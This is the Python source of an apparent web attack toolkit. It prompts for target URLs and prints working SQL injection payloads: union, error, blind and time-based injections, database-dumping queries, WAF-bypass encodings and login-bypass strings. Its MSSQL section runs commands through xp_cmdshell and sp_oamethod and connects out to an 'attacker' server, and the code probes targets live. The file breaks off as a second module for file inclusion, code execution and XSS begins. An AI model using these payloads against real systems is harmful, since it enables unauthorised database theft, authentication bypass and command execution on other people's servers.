#!/usr/bin/env python3
# -*- coding: utf-8 -*-
BTICK = chr(96)  # Backtick character
DQ = chr(34)     # Double quote
SQ = chr(39)     # Single quote

BANNER_ART = f"""
    ╔═══════════════════════════════════════════════╗
    ║                                                       ║
    ║   ██████╗ ███████╗██╗  ██╗ █████╗ ███╗   ██╗    ║
    ║   ██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║   ║
    ║   ██████╔╝█████╗  ███████║███████║██╔██╗ ██║   ║
    ║   ██╔══██╗██╔══╝  ██╔══██║██╔══██║██║╚██╗██║   ║
    ║   ██║  ██║███████╗██║  ██║██║  ██║██║ ╚████║    ║
    ║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ║
    ║                                                       ║
    ║       Advanced Web Penetration Testing Tool v1.0      ║
    ║                                                       ║
    ╚══════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import base64
import binascii
import urllib.parse
import hashlib
import requests
from datetime import datetime
from urllib.parse import urljoin, urlparse

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARKGREEN = '\033[32m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    RED_BG = '\033[41m'
    GREEN_BG = '\033[42m'
    YELLOW_BG = '\033[43m'
    BLUE_BG = '\033[44m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"{Colors.OKGREEN}{Colors.BOLD}{BANNER_ART}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}    Credit: Syed Rehan{Colors.ENDC}")
    print(f"{Colors.OKCYAN}    Developer: @rehuux{Colors.ENDC}")
    print(f"{Colors.WARNING}    This tool is for ethical pentesting and educational purposes only.{Colors.ENDC}")
    print(f"{Colors.FAIL}    Misuse of this tool is strictly prohibited.{Colors.ENDC}")
    print(f"{Colors.GRAY}    {'─' * 70}{Colors.ENDC}")

def loading(text="Loading", duration=1):
    for i in range(duration * 4):
        sys.stdout.write(f"\r{Colors.OKCYAN}[*] {text}{'.' * (i % 4)}{' ' * (3 - i % 4)}{Colors.ENDC}")
        sys.stdout.flush()
        time.sleep(0.25)
    print()

def success(msg):
    print(f"{Colors.OKGREEN}[+] {msg}{Colors.ENDC}")

def error(msg):
    print(f"{Colors.FAIL}[-] {msg}{Colors.ENDC}")

def info(msg):
    print(f"{Colors.OKCYAN}[*] {msg}{Colors.ENDC}")

def warning(msg):
    print(f"{Colors.WARNING}[!] {msg}{Colors.ENDC}")

def separator():
    print(f"{Colors.GRAY}{'─' * 80}{Colors.ENDC}")

def prompt(text):
    return input(f"{Colors.OKGREEN}[?] {text}: {Colors.ENDC}")

def press_enter():
    input(f"\n{Colors.GRAY}[Press Enter to continue...]{Colors.ENDC}")

def pyperclip_copy(text):
    try:
        import pyperclip
        pyperclip.copy(text)
    except:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 1: SQL INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

class SQLInjection:
    def __init__(self):
        self.dios_queries = self._load_dios()
        self.waf_bypass = self._load_waf_bypass()
    
    def _load_dios(self):
        return {
            "Basic DIOS": "CONCAT_WS(0x3a,version(),database(),user())",
            "MySQL DIOS v1": "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=CONCAT(@x,0x3c62723e,table_name,0x203a3a20,column_name)))x)",
            "MySQL DIOS v2": "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat(@,0x0a,table_name,0x3a3a,column_name)))x)",
            "MySQL DIOS v3": "(select(0)from(select count(*),concat((select concat(table_name,0x3a,column_name) from information_schema.columns where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)",
            "MySQL DIOS v4": "extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))",
            "MySQL DIOS v5": "updatexml(0x3a,concat(0x3a,(select concat(table_name,0x3a,column_name) from information_schema.columns where table_schema=database() limit 0,1)),0x3a)",
            "PostgreSQL DIOS": "(select string_agg(table_name||':'||column_name,chr(10)) from information_schema.columns where table_schema='public')",
            "MSSQL DIOS": "(SELECT table_name+':'+column_name FROM information_schema.columns FOR XML PATH(''))",
            "Oracle DIOS": "(SELECT LISTAGG(table_name||':'||column_name,chr(10)) WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns WHERE owner=USER)",
            "SQLite DIOS": "(SELECT group_concat(tbl_name||':'||name,char(10)) FROM sqlite_master LEFT JOIN pragma_table_info(tbl_name))",
            "DIOS All Tables": "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=CONCAT(@x,0x3c62723e,table_name)))x)",
            "DIOS All DBs": "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.schemata)where(0x00)in(@x:=CONCAT(@x,0x3c62723e,schema_name)))x)",
            "DIOS Users": "(select(@x)from(select(@x:=0x00),(select(0)from(mysql.user)where(0x00)in(@x:=CONCAT(@x,0x3c62723e,user,0x40,host,0x3a3a3a,password)))x)",
            "DIOS Version": "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.tables)where(0x00)in(@x:=CONCAT(@x,0x3c62723e,@@version)))x)",
            "DIOS Local Var v1": "SET @x=0x00; SELECT @x:=CONCAT(@x,table_name,0x3a,column_name,0x0a) FROM information_schema.columns WHERE table_schema=database(); SELECT @x;",
            "DIOS Local Var v2": "SET @a=''; SELECT @a:=CONCAT(@a,table_name,0x3a,column_name,char(10)) FROM information_schema.columns WHERE table_schema=database() LIMIT 10; SELECT @a;",
            "DIOS Local Var v3": "SET @t=0x00; SELECT @t:=CONCAT(@t,TABLE_NAME,0x3a,COLUMN_NAME,0x0a) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=DATABASE(); SELECT @t;",
            "DIOS Local Var v4": "SET @r=0x00; SELECT @r:=CONCAT(@r,schema_name,0x0a) FROM information_schema.schemata; SELECT @r;",
            "DIOS Join Method": "(SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) a JOIN (SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1) b)"
        }
    
    def _load_waf_bypass(self):
        return {
            "Basic Comment": "/**/",
            "MySQL Comment": "/*!50000*/",
            "MySQL Inline": "/*!00000select*/",
            "Union Variant 1": "/*!50000%55nIon*/",
            "Union Variant 2": "%55nion(%53elect)",
            "Union Variant 3": "u%u006eion",
            "Select Variant 1": "/*!50000%53eLECT*/",
            "Select Variant 2": "%53elect",
            "Space to Plus": "+",
            "Space to Comment": "/**/",
            "Space to %20": "%20",
            "Space to %09": "%09",
            "Space to %0a": "%0a",
            "Space to %0b": "%0b",
            "Space to %0c": "%0c",
            "Space to %0d": "%0d",
            "Space to %a0": "%a0",
            "And Variant": "&&",
            "Or Variant": "||",
            "Equals to Like": "LIKE",
            "Equals to REGEXP": "REGEXP",
            "Quote Hex": "0x27",
            "Parenthesis": "( )",
            "Double URL Encode": "%%27",
            "Unicode %u": "%u0027",
            "UTF-8 Encode": "%c0%a7"
        }
    
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ SQL INJECTION MODULE ]{Colors.ENDC}")
            separator()
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} Union Based Injection
    {Colors.OKGREEN}[2]{Colors.ENDC} Error Based Injection
    {Colors.OKGREEN}[3]{Colors.ENDC} Boolean Based / Blind Injection
    {Colors.OKGREEN}[4]{Colors.ENDC} Time Based Injection
    {Colors.OKGREEN}[5]{Colors.ENDC} DIOS (Dump In One Shot) Queries
    {Colors.OKGREEN}[6]{Colors.ENDC} WAF Bypass Techniques
    {Colors.OKGREEN}[7]{Colors.ENDC} PostgreSQL Injection
    {Colors.OKGREEN}[8]{Colors.ENDC} MSSQL Injection
    {Colors.OKGREEN}[9]{Colors.ENDC} Authentication Bypass
    {Colors.OKGREEN}[10]{Colors.ENDC} Order By Bypass
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.union_based()
            elif choice == "2":
                self.error_based()
            elif choice == "3":
                self.boolean_based()
            elif choice == "4":
                self.time_based()
            elif choice == "5":
                self.dios_menu()
            elif choice == "6":
                self.waf_menu()
            elif choice == "7":
                self.postgresql()
            elif choice == "8":
                self.mssql()
            elif choice == "9":
                self.auth_bypass()
            elif choice == "10":
                self.order_by_bypass()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)

    def union_based(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ UNION BASED INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter, e.g., http://site.com/page.php?id=1)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        print(f"\n{Colors.OKGREEN}Target: {target}{Colors.ENDC}\n")
        
        print(f"{Colors.WARNING}[*] Step 1: Finding column count...{Colors.ENDC}")
        separator()
        
        col_count = prompt("Enter number of columns (or press Enter to auto-detect with 'ORDER BY')")
        
        if not col_count:
            for i in range(1, 21):
                payload = f"{target}+ORDER+BY+{i}--+-"
                print(f"{Colors.GRAY}  Testing ORDER BY {i}...{Colors.ENDC}")
                try:
                    r = requests.get(payload, timeout=5)
                    if "error" in r.text.lower() or "unknown" in r.text.lower():
                        info(f"Column count found: {i-1}")
                        col_count = str(i-1)
                        break
                except:
                    pass
            if not col_count:
                col_count = "5"
                warning("Auto-detection failed. Using default: 5")
        
        separator()
        print(f"{Colors.WARNING}[*] Step 2: Generating Union payloads for {col_count} columns...{Colors.ENDC}")
        separator()
        
        cols = int(col_count)
        nulls = ",".join(["NULL"] * cols)
        
        payloads = {
            "Basic Union": f"{target}{SQ} UNION SELECT {nulls}--+-",
            "Union with NULL": f"{target}{SQ} UNION ALL SELECT {nulls}--+-",
            "Union with version()": f"{target}{SQ} UNION SELECT {nulls.replace('NULL', 'version()', 1)}--+-",
            "Union with database()": f"{target}{SQ} UNION SELECT {nulls.replace('NULL', 'database()', 1)}--+-",
            "Union with user()": f"{target}{SQ} UNION SELECT {nulls.replace('NULL', 'user()', 1)}--+-",
            "Union with @@datadir": f"{target}{SQ} UNION SELECT {nulls.replace('NULL', '@@datadir', 1)}--+-",
            "Union String Concat": f"{target}{SQ} UNION SELECT CONCAT_WS(0x3a,version(),database(),user()),{nulls[nulls.find(',')+1:]}--+-",
            "4x Method": f"{target}{SQ} UNIunionON SELselectECT {nulls}--+-",
            "Join Method": f"{target}{SQ} UNION SELECT * FROM (SELECT {nulls}) a JOIN (SELECT {nulls}) b--+-",
            "Null Method": f"{target}{SQ} UNION%00SELECT {nulls}--+-"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"{Colors.WARNING}[*] Step 3: Vulnerable column detection payload...{Colors.ENDC}")
        separator()
        
        vuln_payloads = []
        for i in range(1, cols + 1):
            vals = ["NULL"] * cols
            vals[i-1] = "0x723768616e"  # 'r7han' in hex
            vuln_payloads.append(f"{target}{SQ} UNION SELECT {','.join(vals)}--+-")
        
        print(f"\n{Colors.OKCYAN}Use these to find which column reflects on page:{Colors.ENDC}")
        for p in vuln_payloads:
            print(f"{Colors.WHITE}    {p}{Colors.ENDC}")
        
        press_enter()

    def error_based(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ERROR BASED INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "AND ExtractValue": f"{target}{SQ} AND extractvalue(0x0a,concat(0x0a,(select database())))--+-",
            "AND UpdateXML": f"{target}{SQ} AND updatexml(0x3a,concat(0x3a,(select version())),0x3a)--+-",
            "SELECT Floor": f"{target}{SQ} AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-",
            "DOUBLE Query": f"{target}{SQ} AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+-",
            "EXP Error": f"{target}{SQ} AND EXP(~(SELECT * FROM (SELECT CONCAT({SQ}r7han@SQ,(SELECT password FROM mysql.user LIMIT 0,1),{SQ}@r7han{SQ})x))--+-",
            "Geometry": f"{target}{SQ} AND 1=geometrycollection((select * from(select * from(select database())a)b))--+-",
            "MultiPoint": f"{target}{SQ} AND 1=multipoint((select * from(select * from(select database())a)b))--+-",
            "Polygon": f"{target}{SQ} AND 1=polygon((select * from(select * from(select database())a)b))--+-",
            "MultiPolygon": f"{target}{SQ} AND 1=multipolygon((select * from(select * from(select database())a)b))--+-",
            "LineString": f"{target}{SQ} AND 1=linestring((select * from(select * from(select database())a)b))--+-",
            "MultiLineString": f"{target}{SQ} AND 1=multilinestring((select * from(select * from(select database())a)b))--+-"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def boolean_based(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ BOOLEAN BASED / BLIND INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "TRUE condition": f"{target}{SQ} AND {SQ}1{SQ}={SQ}1",
            "FALSE condition": f"{target}{SQ} AND {SQ}1{SQ}={SQ}2",
            "DB length check": f"{target}{SQ} AND LENGTH(DATABASE())=8--+-",
            "DB char extract": f"{target}{SQ} AND SUBSTRING(DATABASE(),1,1)={SQ}a{SQ}--+-",
            "ASCII check": f"{target}{SQ} AND ASCII(SUBSTRING(DATABASE(),1,1))=97--+-",
            "IF Statement": f"{target}{SQ} AND IF(1=1,SLEEP(0),SLEEP(5))--+-",
            "CASE Statement": f"{target}{SQ} AND CASE WHEN 1=1 THEN 1 ELSE 0 END--+-",
            "Binary Search": f"{target}{SQ} AND ASCII(SUBSTRING(DATABASE(),1,1))>90--+-",
            "String compare": f"{target}{SQ} AND STRCMP({SQ}test{SQ},DATABASE())=0--+-",
            "Subselect": f"{target}{SQ} AND (SELECT COUNT(*) FROM mysql.user)>0--+-"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        info("Blind Injection Helper Script:")
        print(f"""
{Colors.GRAY}# Python script to automate boolean-based blind SQLi:{Colors.ENDC}
{Colors.WHITE}import requests
import string

def blind_sqli(target, param):
    result = ""
    chars = string.ascii_lowercase + string.digits + "_-"
    for pos in range(1, 20):
        for char in chars:
            payload = f"{{target}}?{{param}}=1{SQ} AND SUBSTRING(DATABASE(),{{pos}},1)={SQ}{{char}}{SQ}--+-"
            r = requests.get(payload)
            if "valid" in r.text:  # Adjust condition
                result += char
                print(f"Found: {{result}}")
                break
    return result{Colors.ENDC}
        """)
        
        press_enter()

    def time_based(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ TIME BASED INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "SLEEP(5)": f"{target}{SQ} AND SLEEP(5)--+-",
            "SLEEP with IF": f"{target}{SQ} AND IF(1=1,SLEEP(5),0)--+-",
            "SLEEP version": f"{target}{SQ} AND IF(LENGTH(version())=6,SLEEP(5),0)--+-",
            "BENCHMARK": f"{target}{SQ} AND BENCHMARK(5000000,MD5({SQ}r7han{SQ}))--+-",
            "BENCHMARK IF": f"{target}{SQ} AND IF(1=1,BENCHMARK(5000000,MD5({SQ}r7han{SQ})),0)--+-",
            "WAITFOR DELAY": f"{target}{SQ}; WAITFOR DELAY {SQ}0:0:5{SQ}--",
            "WAITFOR TIME": f"{target}{SQ}; WAITFOR TIME {SQ}00:00:05{SQ}--",
            "PG_SLEEP": f"{target}{SQ} AND (SELECT pg_sleep(5))--+-",
            "PG_SLEEP IF": f"{target}{SQ} AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--+-",
            "Heavy Query": f"{target}{SQ} AND 1=(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--+-"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        info("Time-Based Injection Script:")
        print(f"""
{Colors.GRAY}# Python script for time-based blind SQLi:{Colors.ENDC}
{Colors.WHITE}import requests
import time

def time_sqli(target):
    db_name = ""
    for pos in range(1, 10):
        for ascii_val in range(32, 127):
            payload = f"{{target}}{SQ} AND IF(ASCII(SUBSTRING(DATABASE(),{{pos}},1))={{ascii_val}},SLEEP(2),0)--+-"
            start = time.time()
            requests.get(payload, timeout=10)
            elapsed = time.time() - start
            if elapsed > 1.5:
                db_name += chr(ascii_val)
                print(f"[*] Found: {{db_name}}")
                break
    return db_name{Colors.ENDC}
        """)
        
        press_enter()

    def dios_menu(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ DIOS QUERIES - DUMP IN ONE SHOT ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}Available DIOS Queries:{Colors.ENDC}\n")
        
        for i, (name, query) in enumerate(self.dios_queries.items(), 1):
            print(f"{Colors.OKGREEN}[{i:2d}] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}     {query[:80]}{'...' if len(query) > 80 else ''}{Colors.ENDC}")
        
        separator()
        choice = prompt("Enter number to view full query (or 'all' to export all)")
        
        if choice.lower() == 'all':
            filename = f"dios_queries_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write("# REHAN HACKBAR - DIOS Queries\n")
                f.write(f"# Generated: {datetime.now()}\n")
                f.write(f"# Credit: Syed Rehan | Developer: @rehuux\n\n")
                for name, query in self.dios_queries.items():
                    f.write(f"[{name}]\n{query}\n\n")
            success(f"All DIOS queries exported to: {filename}")
        elif choice.isdigit() and 1 <= int(choice) <= len(self.dios_queries):
            name = list(self.dios_queries.keys())[int(choice)-1]
            query = self.dios_queries[name]
            separator()
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}{query}{Colors.ENDC}\n")
            pyperclip_copy(query)
            success("Query copied to clipboard!")
        
        press_enter()

    def waf_menu(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ WAF BYPASS TECHNIQUES ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}Available WAF Bypass Techniques:{Colors.ENDC}\n")
        
        for i, (name, technique) in enumerate(self.waf_bypass.items(), 1):
            print(f"{Colors.OKGREEN}[{i:2d}] {name}: {Colors.WHITE}{technique}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}Example WAF Bypass Payloads:{Colors.ENDC}\n")
        
        examples = [
            ("Basic Union", "UN/**/ION SEL/**/ECT"),
            ("Union Encode", "%55%6E%69%6F%6E %53%65%6C%65%63%74"),
            ("Case Change", "UnIoN SeLeCt"),
            ("MySQL Version", "/*!50000UnIoN*//*!50000SeLeCt*/"),
            ("Double URL", "%%55nion %%53elect"),
            ("Char Encode", "CHAR(85,110,105,111,110)"),
            ("Hex Encode", "0x556e696f6e"),
            ("Concat", "CONCAT({SQ}U{SQ},{SQ}N{SQ},{SQ}I{SQ},{SQ}O{SQ},{SQ}N{SQ})"),
            ("Mixed", "/*!50000%55nIoN*/ /*!50000%53eLeCt*/"),
            ("Newline", "UN%0aION%0aSELECT")
        ]
        
        for name, payload in examples:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def postgresql(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ POSTGRESQL INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "Version": f"{target}{SQ} AND 1=cast((SELECT version()) as int)--",
            "Current DB": f"{target}{SQ} AND 1=cast((SELECT current_database()) as int)--",
            "Current User": f"{target}{SQ} AND 1=cast((SELECT user) as int)--",
            "Tables": f"{target}{SQ} AND 1=cast((SELECT string_agg(tablename,{SQ},{SQ}) FROM pg_tables WHERE schemaname={SQ}public{SQ}) as int)--",
            "Columns": f"{target}{SQ} AND 1=cast((SELECT string_agg(column_name,{SQ},{SQ}) FROM information_schema.columns WHERE table_name={SQ}users{SQ}) as int)--",
            "Data Extraction": f"{target}{SQ} AND 1=cast((SELECT concat(username,{SQ}:{SQ},password) FROM users LIMIT 1) as int)--",
            "pg_sleep": f"{target}{SQ} AND (SELECT pg_sleep(5))--+-",
            "Error Stack": f"{target}{SQ} AND 1=(SELECT 1 FROM pg_sleep(5))--+-",
            "XML Error": f"{target}{SQ} AND XMLPARSE(content {SQ}<r>{SQ}||(SELECT version())||{SQ}</r>{SQ}) IS NOT NULL--"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def mssql(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ MSSQL INJECTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "Version": f"{target}{SQ} AND 1=@@version--",
            "DB Name": f"{target}{SQ} AND 1=db_name()--",
            "User": f"{target}{SQ} AND 1=user--",
            "Host": f"{target}{SQ} AND 1=@@servername--",
            "Tables": f"{target}{SQ} AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype={SQ}U{SQ})--",
            "Columns": f"{target}{SQ} AND 1=(SELECT TOP 1 name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name={SQ}users{SQ}))--",
            "Data": f"{target}{SQ} AND 1=(SELECT TOP 1 username+{SQ}:{SQ}+password FROM users)--",
            "Stacked Query": f"{target}{SQ}; WAITFOR DELAY {SQ}0:0:5{SQ}--",
            "xp_cmdshell": f"{target}{SQ}; EXEC xp_cmdshell {SQ}whoami{SQ}--",
            "sp_oamethod": f"{target}{SQ}; DECLARE @s INT; EXEC sp_oamethod {SQ}wscript.shell{SQ}, {SQ}run{SQ}, NULL, {SQ}cmd /c whoami{SQ}, 0--",
            "OpenRowset": f"{target}{SQ}; SELECT * FROM OPENROWSET({SQ}SQLOLEDB{SQ}, {SQ}server=attacker;uid=sa;pwd=pass{SQ}, {SQ}SELECT * FROM table{SQ})--",
            "Error Cast": f"{target}{SQ} AND 1=(SELECT CAST(@@version AS INT))--",
            "FOR XML": f"{target}{SQ} AND 1=(SELECT table_name+{SQ}:{SQ}+column_name FROM information_schema.columns FOR XML PATH({SQ}{SQ}))--"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def auth_bypass(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ AUTHENTICATION BYPASS ]{Colors.ENDC}")
        separator()
        
        payloads = [
            ("Basic OR", f"{SQ} OR {SQ}1{SQ}={SQ}1{SQ} -- -", "Username/Password field"),
            ("Basic OR v2", f"{SQ} OR 1=1 -- -", "Username/Password field"),
            ("OR with comment", f"{SQ} OR 1=1#", "MySQL comment"),
            ("OR with NULL", f"{SQ} OR {SQ}1{SQ}={SQ}1{SQ}/*", "C-style comment"),
            ("Equals trick", f"{SQ}={SQ}", "Minimal bypass"),
            ("Double quote", f"{DQ} OR {DQ}1{DQ}={DQ}1{DQ} -- -", "Double quote context"),
            ("No quotes", "OR 1=1 -- -", "Numeric context"),
            ("Parenthesis", f"{SQ}) OR ({SQ}1{SQ}={SQ}1{SQ} -- -", "Parenthesized query"),
            ("Parenthesis v2", f"{SQ}) OR {SQ}1{SQ}={SQ}1{SQ} -- -", "Alternative"),
            ("Admin trick", f"admin{SQ} -- -", "Admin bypass"),
            ("Admin trick v2", f"admin{SQ} #", "MySQL admin bypass"),
            ("Admin trick v3", f"admin{SQ}/*", "Comment admin bypass"),
            ("UNION bypass", f"{SQ} UNION SELECT 1, {SQ}admin{SQ}, {SQ}password{SQ} -- -", "Union-based"),
            ("UNION bypass v2", f"{SQ} UNION SELECT NULL, username, password FROM users -- -", "Data extraction"),
            ("LIKE bypass", f"{SQ} OR username LIKE {SQ}%admin%{SQ} -- -", "LIKE operator"),
            ("REGEXP bypass", f"{SQ} OR username REGEXP {SQ}^ad.*{SQ} -- -", "REGEXP operator"),
            ("BETWEEN bypass", f"{SQ} OR 1 BETWEEN 1 AND 1 -- -", "BETWEEN operator"),
            ("EXISTS bypass", f"{SQ} OR EXISTS(SELECT * FROM users) -- -", "EXISTS operator"),
            ("String concat", f"{SQ}||{SQ}1{SQ}={SQ}1{SQ} -- -", "String concatenation"),
            ("No password", f"{SQ} OR {SQ}1{SQ}={SQ}1{SQ} LIMIT 1 -- -", "LIMIT trick")
        ]
        
        separator()
        print(f"\n{Colors.WARNING}Authentication Bypass Payloads:{Colors.ENDC}\n")
        
        for name, payload, desc in payloads:
            print(f"{Colors.OKGREEN}[+] {name} ({desc}):{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}Login Form Bypass Examples:{Colors.ENDC}\n")
        
        login_examples = {
            "Username field": f"admin{SQ} OR {SQ}1{SQ}={SQ}1{SQ} -- -",
            "Password field": f"{SQ} OR {SQ}1{SQ}={SQ}1{SQ} -- -",
            "Both fields": f"admin{SQ} -- -",
            "JSON login": f'{{"user":"admin{SQ} OR {SQ}1{SQ}={SQ}1{SQ} -- -","pass":"anything"}}',
            "XML login": f'<user>admin{SQ} OR {SQ}1{SQ}={SQ}1{SQ} -- -</user><pass>anything</pass>'
        }
        
        for field, payload in login_examples.items():
            print(f"{Colors.OKGREEN}[+] {field}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def order_by_bypass(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ORDER BY BYPASS ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (with parameter)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "Basic ORDER BY": f"{target}+ORDER+BY+1--+-",
            "ORDER BY with NULL": f"{target}+ORDER+BY+NULL--+-",
            "ORDER BY with column": f"{target}+ORDER+BY+(SELECT+1)--+-",
            "ORDER BY with IF": f"{target}+ORDER+BY+IF(1=1,1,(SELECT+1+UNION+SELECT+2))--+-",
            "ORDER BY with CASE": f"{target}+ORDER+BY+(CASE+WHEN+1=1+THEN+1+ELSE+(SELECT+1+UNION+SELECT+2)+END)--+-",
            "ORDER BY with CAST": f"{target}+ORDER+BY+CAST((SELECT+1)+AS+INT)--+-",
            "ORDER BY blind": f"{target}+ORDER+BY+IF(1=1,SLEEP(0),SLEEP(5))--+-",
            "Multiple ORDER BY": f"{target}+ORDER+BY+1,2,3,4,5--+-",
            "ORDER BY with FIELD": f"{target}+ORDER+BY+FIELD((SELECT+1),1,2,3)--+-",
            "ORDER BY with IN": f"{target}+ORDER+BY+(SELECT+1+IN+(1,2,3))--+-"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MODULE 2: LFI / RFI / RCE / XSS PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

class WebAttacks:
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ WEB ATTACKS MODULE ]{Colors.ENDC}")
            separator()
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} LFI (Local File Inclusion)
    {Colors.OKGREEN}[2]{Colors.ENDC} RFI (Remote File Inclusion)
    {Colors.OKGREEN}[3]{Colors.ENDC} RCE (Remote Code Execution)
    {Colors.OKGREEN}[4]{Colors.ENDC} XSS (Cross Site Scripting)
    {Colors.OKGREEN}[5]{Colors.ENDC} XXE (XML External Entity)
    {Colors.OKGREEN}[6]{Colors.ENDC} SSRF (Server Side Request Forgery)
    {Colors.OKGREEN}[7]{Colors.ENDC} SSTI (Server Side Template Injection)
    {Colors.OKGREEN}[8]{Colors.ENDC} Open Redirect
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.lfi()
            elif choice == "2":
                self.rfi()
            elif choice == "3":
                self.rce()
            elif choice == "4":
                self.xss()
            elif choice == "5":
                self.xxe()
            elif choice == "6":
